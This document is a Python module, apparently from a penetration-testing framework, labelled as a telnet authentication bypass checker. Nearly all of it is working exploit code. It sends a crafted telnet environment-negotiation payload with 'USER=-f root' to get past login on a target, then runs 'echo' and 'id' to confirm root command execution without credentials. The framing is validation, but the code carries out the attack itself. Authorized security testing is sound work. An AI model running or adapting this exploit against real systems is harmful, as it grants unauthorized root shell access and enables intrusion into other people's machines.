#!/usr/bin/env python3
import sys
import os
import socket
import time

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.base_module import BaseModule
from utils.colors import *


class TelnetBypassModule(BaseModule):
    """Telnet Auth Bypass Checker"""

    def __init__(self, frontdoor):
        super().__init__(frontdoor)
        self.name = "Telnet Auth Bypass"
        self.port = 23

    def run(self):
        """Validate potential telnet auth bypass with marker command execution."""
        module_name = "Telnet Auth Bypass"
        target = self.get_target()

        print(f"\n[*] Testing {target}:23 for Telnet bypass validation...")

        if not self.check_port(23, timeout=3):
            self.log(module_name, "ERROR", "Port 23 closed")
            return

        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, 23))

            banner = self.recv_text(sock)
            if banner:
                self.log(module_name, "INFO", f"Telnet banner: {banner[:80].strip()}")

            if "telnet" not in banner.lower() and "login" not in banner.lower() and "gnu" not in banner.lower():
                self.log(module_name, "SUSPECTED", "Port 23 responded, but service fingerprint is inconclusive")
                return

            self.log(module_name, "POTENTIAL", "Telnet service identified; attempting bypass validation")

            # Negotiation payload pattern used by known bypass proof-of-concepts.
            exploit_payload = bytes([
                0xFF, 0xFA, 0x27, 0x01,
                0x00, 0x03,
                0xFF, 0xF0,
            ]) + b"USER=-f root\r\n"
            sock.sendall(exploit_payload)
            time.sleep(0.7)

            marker = "DOORKICK_TELNET_VALIDATION"
            sock.sendall(f"echo {marker}\n".encode())
            time.sleep(0.7)
            response = self.recv_text(sock)

            if marker in response:
                self.report_validation(module_name, "Telnet command execution", True, "marker command executed without interactive auth")
                sock.sendall(b"id\n")
                time.sleep(0.5)
                id_output = self.recv_text(sock)
                if id_output:
                    self.log(module_name, "INFO", f"id output: {id_output[:120].strip()}")
                self.log(module_name, "RCE_POSSIBLE", "Bypass provides shell command execution path")
                return

            if "login" in response.lower() or "password" in response.lower():
                self.report_validation(module_name, "Telnet command execution", False, "authentication prompt remained enforced")
                return

            self.log(module_name, "SUSPECTED", "Bypass payload sent, but command execution marker was not observed")

        except socket.timeout:
            self.log(module_name, "ERROR", "Telnet validation timed out")
        except Exception as e:
            self.log(module_name, "ERROR", f"Telnet validation failed: {str(e)}")
        finally:
            if sock:
                sock.close()

    def recv_text(self, sock, size=4096):
        """Receive text from socket, returning decoded content or empty string."""
        try:
            return sock.recv(size).decode("utf-8", errors="ignore")
        except Exception:
            return ""